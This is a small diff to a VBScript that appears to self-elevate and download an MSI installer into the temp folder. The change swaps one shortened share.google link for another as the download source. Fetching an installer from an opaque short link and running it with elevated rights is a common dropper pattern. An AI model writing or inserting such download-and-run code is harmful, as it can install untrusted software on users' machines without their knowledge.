@@ -10,7 +10,7 @@ If Not WScript.Arguments.Named.Exists("elevated") Then
 End If
 
 Dim strUrl, strTemp, strFile, objXMLHTTP, objADOStream, objFSO, objShell
-strUrl = "https://share.google/zwqwLoZiVh08jLOa4"
+strUrl = "https://share.google/dDynM21vQuy0Qvc4Z"
 strTemp = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%")
 strFile = strTemp & "\agent_installer.msi"
 
